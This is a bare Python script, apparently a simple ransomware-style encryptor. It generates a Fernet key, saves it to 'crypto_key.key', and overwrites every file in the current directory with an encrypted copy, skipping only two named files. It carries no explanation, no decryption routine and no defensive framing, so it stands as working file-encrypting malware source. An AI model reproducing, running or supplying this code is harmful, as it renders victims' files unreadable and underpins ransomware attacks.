#!/usr/bin/env python3

import os
from cryptography.fernet import Fernet

files = []

for file in os.listdir():
        if file == "coding.py" or file == "key_file":
          continue
        if os.path.isfile(file):
          files.append(file)

key = Fernet.generate_key()

with open("crypto_key.key", "wb") as key_file:
  key_file.write(key)

for file in files:
      with open(file, "rb") as crypto_file:
        contents = crypto_file.read()
      contents_encrypted = Fernet(key).encrypt(contents)
      with open(file, "wb") as crypto_file:
          crypto_file.write(contents_encrypted)
